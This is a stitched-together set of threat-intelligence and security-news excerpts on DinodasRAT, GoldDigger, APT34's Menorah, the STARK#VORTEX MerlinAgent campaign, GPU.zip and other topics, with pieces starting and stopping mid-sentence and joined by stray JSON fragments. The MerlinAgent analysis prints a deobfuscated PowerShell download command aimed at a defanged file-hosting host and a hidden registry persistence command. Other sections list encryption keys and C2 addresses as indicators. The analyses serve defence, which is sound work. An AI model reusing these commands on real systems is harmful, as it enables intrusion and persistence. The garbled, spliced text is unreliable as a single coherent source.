the hypothesis is further supported by recent developments in Guyana–China diplomatic relations. In February 2023, the same month that Operation Jacana occurred, the Special Organised Crime Unit (SOCU) of Guyana arrested three people in a money laundering investigation involving Chinese companies, an act disputed by the local Chinese embassy. Additionally, as part of the Belt and Road Initiative, China has economic interests in Guyana. As the first step in breaching their victim’s network, the threat actors behind Operation Jacana sent the target organization spearphishing emails referencing Guyanese public affairs. We observed the following subject lines:The spearphishing emails contained a link that, when clicked, downloaded a ZIP file from https://fta.moit.gov[.]vn/file/people.zip. Since a domain ending with gov.vn indicates a Vietnamese governmental website, we believe that the operators were able to compromise another governmental entity and use it to host their malware samples. We have notified the VNCERT about the compromised infrastructure.Once the victim extracted the ZIP file, which wasn’t password protected, and launched the contained executable, they became compromised with the DinodasRAT malware. The extracted filenames are related to the phishing email subject lines:Some of the commands the attackers executed on the network include:DinodasRAT is a previously undocumented remote access trojan developed in C++ with various capabilities that allow an attacker to spy on and collect sensitive information from a victim’s computer. When executed, the malware first checks whether three arguments were passed. If present, these arguments must contain the following information in the following order:If all three arguments were passed, DinodasRAT terminates the process represented by the process ID using the Windows API TerminateProcess then uses the Windows API DeleteFileW to delete the file passed in the third argument. After this, the process stops its execution by using the C++ standard library exit function. This is most likely intended as an uninstall function.The Application Doc directory is created with the attributes Read-only and Hidden. Inside of Application Doc, DinodasRAT creates two subdirectories, named 0 and 1. Once the directory exists, the malware spawns three threads used for data collection and exfiltration. A detailed description of their behavior is given in Table 1.Table 1. Thread descriptions\n\n\nThread\nDescription\n\n\n\n\n1\n\nTake a screenshot of the display of the victim’s machine every five minutes using Windows API functions like CreateDCW, BitBlt, DeleteDC, or ReleaseDC. The screenshot is compressed and saved in the subdirectory Application Doc\\0.\nIn order to compress the screenshot, the attackers use the zlib library, version 1.2.11.\nThe format of the filename used for the saved screenshots is the following: <YYYYMMDDHHMMSS>_<five random digits>_<one random digit>.jpg\n\n\n\n2\n\nGet the content of the clipboard every five minutes using the Windows API function GetClipboardData and save it in the subdirectory Application Doc\\1.\nThe format of the filename used for the clipboard data file is the following: DateTimeStamp_<five random digits>_<one random digit>.txt\n\n\n\n3\nLoops through the subdirectories 0 and 1 and sends the filenames, encrypted with TEA and base64 encoded, to the C&C server. If the C&C server replies, it creates another packet in order to send the filename with its data. Finally, it deletes the file from the victim’s machine.\n\n\nTake a screenshot of the display of the victim’s machine every five minutes using Windows API functions like CreateDCW, BitBlt, DeleteDC, or ReleaseDC. The screenshot is compressed and saved in the subdirectory Application Doc\\0.In order to compress the screenshot, the attackers use the zlib library, version 1.2.11.The format of the filename used for the saved screenshots is the following: <YYYYMMDDHHMMSS>_<five random digits>_<one random digit>.jpgGet the content of the clipboard every five minutes using the Windows API function GetClipboardData and save it in the subdirectory Application Doc\\1.The format of the filename used for the clipboard data file is the following: DateTimeStamp_<five random digits>_<one random digit>.txtAfter the threads are spawned, DinodasRAT creates a file named conf.ini in the main directory. This file contains an ID used to identify the victim to the C&C server. Figure 2 shows an example of the ID saved in the conf.ini file.The format of the ID is Din_<YYYYMMDD>_<MD5-HASH>_<RANDOM-VALUE>_V1, where:We found that the malware contains three different keys used for different encryption/decryption scenarios, as described in Table 2.Table 2. TEA keys used by DinodasRAT\n\n\nKey N\nValue\nDescription\n\n\n\n\n1\nA1 A1 18 AA 10 F0 FA 16 06 71 B3 08 AA AF 31 A1\nUsed mainly to encrypt/decrypt communications with the C&C server.\n\n\n2\nA0 21 A1 FA 18 E0 C1 30 1F 9F C0 A1 A0 A6 6F B1\nUsed to encrypt the name of the files created in the screenshot functionality, before they are sent to the C&C server.\n\n\n3\n11 0A A8 E1 C0 F0 FB 10 06 71 F3 18 AC A0 6A AF\nUsed to decrypt the installation paths.\n\n\nIn order to communicate with the C&C server, DinodasRAT uses the Winsock library to create a socket that uses the TCP protocol. Although TCP is the default protocol used to send and receive information from the C&C server, we have seen that DinodasRAT is capable of changing to the UDP protocol.The backdoor also creates various threads for different purposes, such as manipulating a received command to execute on the victim’s machine. Hence, in order to maintain synchronized communication, DinodasRAT makes use of Windows event objects by using Windows API functions like CreateEventW, SetEventW, and WaitForSingleObject.To start the main communication with the C&C server, DinodasRAT sends a packet with basic information about the victim’s machine and its configuration, such as:Figure 3 shows not only basic information collected about the victim, but also the ID generated by the malware, which serves as a victim identifier for the C&C server.All the information that DinodasRAT sends to the C&C server via the TCP protocol is TEA encrypted. In addition to that, some of the information is also base64 encoded.To send the stolen information to the C&C server, DinodasRAT crafts a packet containing the following:Figure 4 shows an example of an encrypted packet to be sent to the C&C server.During our analysis we were unable to obtain a response from the C&C server, but we were able to determine that any packets received from the server should also be encrypted with TEA.When it comes to handling commands received from the C&C server, DinodasRAT creates a thread with an infinite loop responsible for receiving and determining whether packets contain encrypted commands to execute.A packet, once decrypted, contains the following structure:DinodasRAT contains commands capable of performing various actions on a victim’s machine or on the malware itself. Table 3 lists the supported commands with a short description of each. Table 3.

We believe with medium confidence that it was conducted by a China-aligned APT group.The attackers used a combination of previously unknown tools, such as DinodasRAT, and more traditional backdoors such as Korplug.Based on the spearphishing emails used to gain initial access to the victim’s network, the operators are keeping track of the geopolitical activities of their victims to increase the likelihood of their operation's success.\n\n\n\nSHA-1\n\n\nFilename\n\n\nESET detection name\n\n\nDescription\n\n\n\n\n\n\n599EA9B26581EBC7B4BDFC02E6C792B6588B751E\n\n\nPresident Mohamed Irfaan Ali's Official Visit to Nassau, The

      "text": " Singapore-based infosec outfit Group-IB on Thursday released details of a new Android trojan that exploits the operating system's accessibility features to steal info that enables theft of personal information.The malware makes its way onto devices after users visit fake websites that manipulate them into downloading the app. Once installed, GoldDigger requests access to Android’s Accessibility Service – the feature designed to assist users with disabilities by allowing apps to interact with each other and modify the user interface.Permission to use the Accessibility Service means GoldDigger can monitor and manipulate a device's functions and view personal information such as banking app credentials and the content of SMS messages, and send that info to command-and-control servers. A code snippet found by the researchers suggests the malware attempts to bypass two factor authentication, and is designed to fool banking apps that it is making legitimate transactions.\"We have not confirmed that the Trojan operators use these capabilities at the time of writing. However, based on the behavior of other known Trojans similar to GoldDigger, we don't think they differ significantly,\" explained Group-IB.\"We are definitely observing a significant increase in the Android malware strains abusing the Accessibility Service. For Android malware trends, there is a noticeable shift away from the traditional use of web fakes,\" Sharmine Low, malware analyst at Group-IB, told The Register. Low said using the Accessibility Function was a \"much more invasive approach compared to generating individual web fake files for each specific target.\"GoldDigger's developers have left clues that their ambitions may reach beyond Vietnam. The malware includes translations in Chinese and Spanish, suggesting that countries where those languages are spoken may be next in line as targets.One way the security firm noted the malware could be prevented – aside from the usual check for updates, watch out for unusual permissions and adopting fraud protection services – is to keep the \"Install from Unknown Sources\" setting disabled by default on Android devices. Only if the setting is enabled can APKs from sources outside Google Play Store be installed. ®The Register   Biting the hand that feeds IT\n                        Copyright.

Following the campaign, the group abused a fake license registration form of an African government agency to target a victim in Saudi Arabia.By: Mohamed Fahmy, Mahmoud Zohdy\n\t\t\n\t\t\tSeptember 29, 2023\nRead time:  ( words)\n\tSave to FolioDuring our investigation, there was little information about the victims targeted by this malware. But the file that APT34 used for this attack is called “MyCv.doc,” a license registration form related to the Seychelles Licensing Authority. However, we noted that the document contained pricing information in Saudi Riyal, which might indicate that the targeted victim was an organization inside the Kingdom of Saudi Arabia. This blog post provides an analysis of the group’s latest malware and its capabilities, shows the attack process, and details the attackers’ infrastructure.APT34 background and targetingInfection routineThe infection starts with a malicious document dropping a hardcoded malware and creates a scheduled task for persistence once the targeted victim opens the document. The malicious document contains hidden macros responsible for dropping a .NET malware into the <%ALLUSERSPROFILE%\\Office356> directory, naming it Menorah.exe. It then creates a scheduled task named \"OneDriveStandaloneUpdater\" to execute the Menorah.exe malware. The image in Figure 2 shows a portion of the macros' functions responsible for string transformation, decoding, and the creation of the scheduled task.Malware analysisThe .NET-written malware delivered through the malicious document is primarily deployed for cyberespionage and possesses multifaceted capabilities. The malware can fingerprint the targeted machine, list directories and files, upload selected files from the compromised system, execute shell commends, and download files to the system.Compared to the previous variant of SideTwist, the new variant has more functions to hash the traffic to the command and control (C&C) server and make it stealthier to avoid detection. Initially, the malware conducts a specific argument check during execution to ensure the correct flow of its operations. In the absence of the specified argument, the malware will terminate and stop its execution. The regular check ensures the routine’s and components’ stealth, and detects if the malware is in an analytic environment like a sandbox. If the argument determines that it’s running inside a sandbox, the malware will run without the argument and terminate itself.We identified the C&C server, http[:]//tecforsc-001-site1[.]gtempurl.com/ads.asp, as a string subsequently used for HTTP communication and to create a timer to repeat a specific code every 32,000 milliseconds (or every 32 seconds) as a way to organize communication with the C&C server.Then, the malware fingerprints the machine by getting the machine name and username in this format: {MachineNameUsername}. The malware continues to encode the string into ASCII then calculates for the MD5 hash from it. The MD5 hash is combined with the {MachineNameUsername} in the format {‘d@{MD5 hash}@MachineName|Username} XOR with a hardcoded string and encoded in Base64, creating a fingerprint for the compromised system. This fingerprint is sent to the C&C server as the content of an HTTP request, as shown in the figure below.Unfortunately, the C&C server was inactive at the time of analysis. However, from the analysis for functions responsible for parsing the C&C, we expected that the response returned will be an encrypted massage and further encoded in Base64. The decrypted and decoded message split into an array, and each value inside it represents part of the message received from the C&C server. Based on these values, the malware will have specific actions on the machine.From static analysis, we observed the malware capable of executing a command received from the C&C server, list directory and files on the compromised system, and upload specific files to server and download files. The following are the malware’s commands, values, and actions:Similarities to backdoor SideTwistConclusionsThe similarities to the SideTwist backdoor suggests that APT34 is in continuous-development mode, changing up and trying which routines and techniques will work. Typical of APT groups, APT34 demonstrates their vast resources and varied skills, and will likely persist in customizing routines and social engineering techniques to use per targeted organization to ensure success in intrusions, stealth, and cyber espionage. The earlier variant of SideTwist is written in C, and this latest variant has a very similar set of functions but in a .NET implementation.Indicators of Compromise (IOCs)URLhxxp://tecforsc-001-site1[.]gtempurl[.]com/ads.aspMohamed FahmyThreat ResearcherMahmoud ZohdyThreat ResearcherTry our services free for 30 daysSelect a country / regionCopyright ©2023 Trend Micro Incorporated.

Taking proactive measures to eliminate whole categories of vulnerabilities, such as utilizing memory-safe coding languages or implementing parameterized queries, is also essential.Lastly, Goldstein said it's imperative to mandate multifactor authentication (MFA) for privileged users and establish MFA as a default feature, making it a standard practice rather than an optional choice.Mitigations that would have this effect include:Besides applying the outline mitigations, NSA and CISA recommend \"exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework\" in today's advisory.The two federal agencies also advise testing existing security controls inventory to assess their performance against the ATT&CK techniques described in the advisory."

The firm began offering a free security key to account owners in the US from fall 2021, and a year later enabled organizations to register up to eight MFA devices per account root user or per IAM user in AWS.“While the requirement to enable MFA for root users of AWS Organizations management accounts is coming in 2024, we strongly encourage our customers to get started today by enabling MFA not only for their root users, but for all user types in their environments.”This happened in nearly two-fifths (36%) of real-world cloud incidents investigated by the security vendor, with credentials either discovered during an attack or stolen/phished prior to targeting an account."

In such cases, it's advised to exercise caution, read about romance scams, and refrain from sending money to individuals not met in person.Additionally, consumers should research companies thoroughly before making purchases since online searches using a company's name and keywords like \"scam\" or \"complaint\" can provide valuable insights.\"Most of these reports come from people who never received the items they ordered after responding to an ad on Facebook or Instagram.\"That amounted to a massive 18-fold increase over 2017 losses and more than double compared to those reported during 2020.At the time, the agency revealed that roughly 2.4 million Americans reported financial losses due to scams last year, with a majority falling prey to impostor and online shopping scams in 2022."

      "text": " There are at least 100,000 industrial control systems (ICS) exposed to the public Internet around the world, controlling a host of critical operational technologies (OT) like power grids, water systems, and building management systems (BMS). While that's a big number, researchers note that quantifying true cyber-risk from that exposure means examining which protocols the gear uses.In a recent analysis, researchers from cyber-risk handicapper Bitsight reached the 100,000 number by inventorying reachable devices that use the top 10 most popular and widely used ICS protocols (including Modbus, KNX, BACnet, Niagara Fox, and others.)\"These ICS devices are used to control much of the physical infrastructure in our society, from traffic lights to vaccine production,\" according to a recent report from the firm. \"Disruption of these systems could lead to significant business disruption, threats to human safety, data and intellectual property (IP) compromise, national security threats, and more.\"Pedro Umbelino, principal security researcher at Bitsight, notes that there are few, if any, reasons for this type of equipment to be directly reachable via the Internet, so the risk level seems like a soluble problem.\"The systems we identified as Internet-facing could be due to misconfigurations, or neglect of best practices,\" he explains. \"Typically, attackers scan for Internet-facing systems and then gather information to determine if that system has a vulnerability. So if systems are behind a firewall or otherwise not Internet facing, then much of the risk of exploitation is mitigated.\"Understanding risk within ICS environments takes more than simply determining how many devices are reachable from the Internet. Specifically, the use of different protocols can be important clues in determining where cyberattackers might be probing for weaknesses.\"Some protocols we explored lack security measures, like basic authentication, leaving the devices pretty much open to anyone,\" he says.\"Other protocols are very verbose, clearly indicating the brand, model, and version of the device, hugely simplifying an attacker's task to search for readily available exploits,\" Umbelino explains. \"The adoption of different protocols indicates different devices are present in an organization's exposed surface. This implies different vendors, different supply chains, [and] different software running.\"Organizations should also be aware that tailoring attacks by protocol also could help with geotargeting. Bitsight pointed out that exposed industrial control systems using CODESYS, KNX, Moxa Nport, and S7 are largely concentrated in the European Union (EU). Meanwhile, exposed systems using ATG and BACnet largely reside in the US. Modbus and Niagara Fox on the other hand are present globally.The takeaway is that ICS-owning organizations can inventory their protocol use, and use that as a variable to identify risk and inform their OT/ICS security strategies, Umbelino says. For instance, it may not always be practical to reconfigure an entire critical infrastructure environment to eliminate Internet-facing points, so knowing where to focus first can be invaluable.While Bitsight's topline findings should signal a wakeup call for critical infrastructure stakeholders everywhere, it's worth noting that the level of ICS exposure has actually declined over time, even amid the move to \"smart\" OT environments and more digitization. In 2019, the number of exposed ICS devices within the parameters of the study sat at nearly 140,000.From a practical standpoint, owners of ICS environments can shore up their security by taking some common-sense steps, according to Bitsight:\"In a nutshell, as a rule of thumb: reduce exposure,\" Umbelino says. \"Industrial control systems do not belong on the public Internet. Use firewalls, configure access controls, take advantage of virtual private networks or any other mechanism that prevents the devices from being widely reachable.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe UK’s National Cyber Security Centre (NCSC) has ramped up efforts to encourage firms to run incident response exercises, with a new scheme to certify assured providers.The agency said it has chosen long-time partners CREST and IASME to be its delivery partners. They will assess the suitability of organizations to become Assured Service Providers in a new Cyber Incident Exercising (CIE) scheme.They are both now ready to accept enquiries from UK-based providers of cyber-incident exercise services.“We are determined that companies of any size can apply to join any of our schemes. We particularly welcome companies located in or serving geographically remote or under-represented areas,” the NCSC said in a blog post.“Similarly, if your company is working hard to address issues of under-representation in the cybersecurity workforce, we’d love to see your application.”Companies will be assessed in their ability to deliver two types of incident response exercise.Tabletop exercises are discussion-based sessions, involving conversations between participants about their roles and responsibilities, activities and “key decision points” for a pre-agreed scenario.What the NCSC calls “live-play sessions” involve responding in real-time to a pre-agreed incident scenario, although these are more suited to mature organizations looking for detailed validation of their plans, the agency said.These exercises are only intended to simulate incidents involving a single organization, rather than a national emergency or something impacting a large section of the population, the NCSC clarified."

These attacks are increasingly dangerous because they are often text-based, sent from legitimate domains and lack typical indicators of compromise.Responding to such an innocuous-seeming email could result in the attacker gaining access to critical financial information and potentially diverting payments, causing substantial losses to the healthcare network.As the year progresses, the healthcare industry should prepare for a continued increase in email attacks, Abnormal wrote. “Fortunately, there are solutions available to prevent these attacks from reaching doctors, nurses, and healthcare staff. By embracing sophisticated cloud email security, healthcare organizations can dramatically improve their cybersecurity practices.”"

This script will monitor for form submissions to steal passwords from any form inputs of type 'password.'As many compromised tokens also granted access to private repositories, the attack affected both public and private GitHub repositories.Checkmarx's analysts examined the logs from some victims and found that their accounts were compromised using stolen PATs (personal access tokens).These tokens are stored locally on the developer's computers and can be used to log in to GitHub without going through 2FA (two-factor authentication) steps.\"Sadly, the token's access log activity is not visible in the account's audit log. So if you're token got compromised, you can't know for sure because the access logs are missing,\" warns CheckmarxAlthough the cybersecurity firm didn't reach a concrete conclusion on the exact means by which the attackers stole these tokens, they assume it might be through a malware infection possibly introduced to the developer's device via a malicious package.Most compromised users are from Indonesia, implying a targeted attack tailored to this demographic.

In the plugin context, the user can enable password reset through a link that will be sent to the user’s email,” Patchstack wrote in an advisory published earlier today.A critical condition exists when the function can be manipulated through some GET parameters, enabling users to register with any membership level from an arbitrary member account.In the Authenticated Account Takeover vulnerability, a separate function handles password reset through a link feature. By carefully crafting the parameters, an attacker could exploit this vulnerability to take control of a user’s account.“For the first vulnerability, the vendor decided to check if the SQL query to update the member information via the code parameter is valid. This code value could only be obtained by users that already completed their payment or process on a paid membership level,” Patchstack wrote. “For the second vulnerability, the vendor decided to match the login parameter used for the reset password key check and the actual user object on the $user_data variable.”The vendor released version 4.3.5 on August 30 2023 to patch these issues, implementing checks to validate user-controlled parameters in custom registration and password reset processes."

Although the digital certificate is not valid, ZenRAT’s installer lists Tim Kosse, the developer of the open-source FileZilla FTP software, as the signer.Despite having functions specific to an information stealer, Proofpoint has found evidence suggesting that the malware is designed to be modular and its capabilities can be expanded; however, no other modules have been observed in the wild.The Bitwarden password manager has increased in popularity lately as it is regarded as a better alternative to other products on the market.

      "text": " Researchers from four American universities have developed a new GPU side-channel attack that leverages data compression to leak sensitive visual data from modern graphics cards when visiting web pages.The researchers disclosed the vulnerability to impacted video card manufacturers in March 2023. However, as of September 2023, no affected GPU vendors (AMD, Apple, Arm, NVIDIA, Qualcomm) or Google (Chrome) have rolled out patches to address the problem.Generally, data compression creates distinct data-dependent DRAM traffic and cache utilization, which can be abused for leaking secrets, so software turns off compression when handling sensitive data.The GPU.zip researchers explain that all modern graphic processor units, especially integrated Intel and AMD chips, perform software-visible data compression even when not explicitly asked.Modern GPUs follow this risky practice as an optimization strategy, as it helps save on memory bandwidth and improve performance without software.This compression is often undocumented and vendor-specific, and the researchers have found a way to exploit it to leak visual data from GPUs.Specifically, they demonstrated an attack that extracts individual pixel data through a web browser on various devices and GPU architectures, as shown below.The proof-of-concept attack demonstrates stealing the username from a Wikipedia iframe, which is possible within 30 minutes on Ryzen and 215 minutes on Intel GPUs, at accuracies of 97% and 98.3%, respectively.The iframe hosts a cross-origin webpage whose pixels are isolated and turned into binary, meaning they're converted into two possible colors.Next, these pixels are enlarged, and a specialized SVG filter stack is applied to create textures that are either compressible or not. By measuring the time taken for the texture to render, the researchers can deduce the original color/state of the target pixel.While Hot Pixels exploits data-dependent computation times on modern processors, GPU.zip hinges on undocumented GPU data compression to achieve similar results.GPU.zip impacts almost all major GPU manufacturers, including AMD, Apple, Arm, Intel, Qualcomm, and NVIDIA, but not all cards are equally affected.The fact that none of the impacted vendors have decided to fix the issue by optimizing their data compression approach and limiting its operation to non-sensitive cases further raises the risk.Although GPU.zip potentially impacts the vast majority of laptops, smartphones, tablets, and desktop PCs worldwide, the immediate impact on users is moderated by the complexity and time required to perform the attack.Also, websites that deny cross-origin iframe embedding cannot be used for leaking user data through this or similar side-channel attacks.\"Most sensitive websites already deny being embedded by cross-origin websites. As a result, they are not vulnerable to the pixel stealing attack we mounted using GPU.zip,\" explains the researchers in a FAQ on the team's website.Finally, the researchers note that Firefox and Safari do not meet all the criteria needed for GPU.zip to work, such as allowing cross-origin iframes to be loaded with cookies, rendering SVG filters on iframes, and delegating rendering tasks to the GPU.Update 9/28 - An Intel spokesperson has sent BleepingComputer the following comment regarding the GPU.zip risk and its impact on the firm's products:While Intel hasn't had access to the researcher’s full paper, we assessed the researcher findings that were provided and determined the root cause is not in our GPUs but in third party software."

      "text": " By Securonix Threat Research: D.Iuzvyk, T.Peck, O.KolesnikovSept. 25, 2023, updated Sept. 27, 2023, updated Oct. 6, 2023As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down. New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.Our team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military. Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware. Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection. We’ll go over each stage in detail further down.The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine. Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007. They can, however, be opened and executed in modern Windows versions.Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chmAs we mentioned previously, the lure document was themed as a drone or UAV manual. Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chmSince Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip. With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chmAfter examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags. Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.Figure 4: Example of obfuscated JavaScript code found within page1.htmlFigure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chmAfter deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code. This time some key information such as C2 URL and payload names become visible. This is seen in the figure below.Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chmWith the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing. In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.Figure 7: Deobfuscated PowerShell analysis — file download, directory setupThis first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize). The bulk of the code is stored inside the doS function which is called at the end of the script.Next the script performs key functions:The script then downloads the file from the C2 server. The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command:[System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”)The command is then executed using an invoke expression (IEX).Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below:Figure 8: Deobfuscated PowerShell — binary file decodingIn a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.Compute the hash and fill the XOR mask File transformation using the XOR mask:Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective. It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.Figure 9: Stage 3, deobfuscated PowerShellThe last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file. The last portion of the script then executes the original file in a few different ways.The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier. Also the existence of optional binary file arguments which were set to “null” in this case.The Windows binary file downloaded is a 64-bit executable at about 5MB in size. Some additional binary information is highlighted in figure 10 below.Figure 10: ctlhost.exe — binary file overviewUpon closer examination, it appears to be a generated binary executable by the MerlinAgent framework. Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.The MerlinAgent framework is an open source C2 framework written in Go. It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads. Attackers can then distribute these payloads and incorporate them into their own malware stager or loader. MerlinAgent has a wide range of capabilities which include:The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for:Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com. It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”. This will execute the binary file every time the user logs into the system.Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file. Typically receiving a Microsoft help file over the internet would be considered unusual. However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .During the STARK#VORTEX campaign we observed the following network communication to C2 hosts. Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443. Request related details will be provided in Appendix A below.Always be extra cautious downloading file attachments from posts for private messages. When it comes to prevention and detection, the Securonix Threat Research Team recommends:References:“request”: {   “HOST”: “listen.servemp3[.]com”,   “ACCEPT-ENCODING”: “gzip”,   “server_conn“: “168.100.8 [.]245”,   “AUTHORIZATION”: “Bearer eyJhbGc[REDACTED]UFQ”,   “CONTENT-LENGTH”: “1826”,   “CONTENT-TYPE”: “application/octet-stream; charset=utf-8”,   “USER-AGENT”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36”},“request_hex”: “fe 02 26 0c 00 fe 02 21[REDACTED]48 34 77 33 58 77 “,“body_hex”: “fe 0c 40 0c 00 fe 0c 3b[REDACTED]74 4b 61 55 6b 65 69 78 56 78”,“method”: “POST”,  }, The lure document has also been retargeted. As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign. Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload. The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”. When opened, the content of the lure file simply contains a few company logos.Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner. Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chmThe PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod. The encoded payload is decoded and then executed in almost the same fashion as we saw before. The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net. Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game. This does speculate that it was probably not intended for business systems where games would normally not be found. Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week. The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.

This malware is known for using overlays to capture personally identifiable information (PII) such as usernames and passwords. Notably, it features a sophisticated automated transfer system (ATS) engine, enabling a wide range of actions and modules, enhancing its adaptability.The latest campaign has seen a geographical expansion, with thousands of Xenomorph downloads recorded in Spain and the United States, reflecting a broader trend among malware families to target new markets across the Atlantic.In technical terms, Xenomorph has added new capabilities to its arsenal, including an anti-sleep feature, a “mimic” mode to avoid detection and the ability to simulate touch actions. The malware’s targets include Spain, Portugal, Italy, Canada, Belgium, numerous US financial institutions and cryptocurrency wallets.Another noteworthy development is the observation of Xenomorph being distributed alongside powerful desktop stealers, raising questions about potential connections between threat actors behind these malware variants, or the possibility that Xenomorph is now being offered as a Malware-as-a-Service (MaaS) for use in conjunction with other malicious software families.According to an advisory published by ThreatFabric on Monday, this resurgence underscores the persistent efforts of cyber-criminals to maximize their profits.“Xenomorph, after months of hiatus, is back, and this time with distribution campaigns targeting some regions that have been historically of interest for this family,” reads the technical write-up.“Xenomorph maintains its status as an extremely dangerous Android Banking malware, featuring a very versatile and powerful ATS engine, with multiple modules already created, with the idea of supporting multiple manufacturer’s devices.”Editorial image credit: HI_Pictures / Shutterstock.com"

A scheduled task named \"Microsoft Office Updates\" is created to launch DangerAds daily for three days.DangerAds functions as a loader, assessing the host environment and running built-in shellcode if specific strings are found in the system's username or domain name, an example of AtlasCross's narrow targeting scope.Eventually, DangerAds loads x64.dll, which is the AtlasAgent trojan, the final payload delivered in the attack.AtlasAgent is a custom C++ trojan and its core functions include extracting host and process details, preventing the launch of multiple programs, executing additional shellcode on the compromised machine, and downloading files from the attacker's C2 servers.Upon first launch, the malware sends information to the attacker's servers, including local computer name, network adapter information, local IP address, network card info, OS system architecture and version, and a running process list.The attacker's servers will then respond with commands for AtlasAgent to execute, which can be done using new threads or within one of the existing processes, making it harder for security tools to detect and stop.Moreover, AtlasAgent supports the following commands:While NSFocus' report is the first detailing the new hacking group, AtlasCross remains a largely unknown threat that operates on unclear motives and obscure targeting scope.The threat actor's selective targeting, custom-made trojans, and malware loaders, combined with a preference for discreet infection methods over efficiency, have allowed them to operate undetected for an undefined duration."

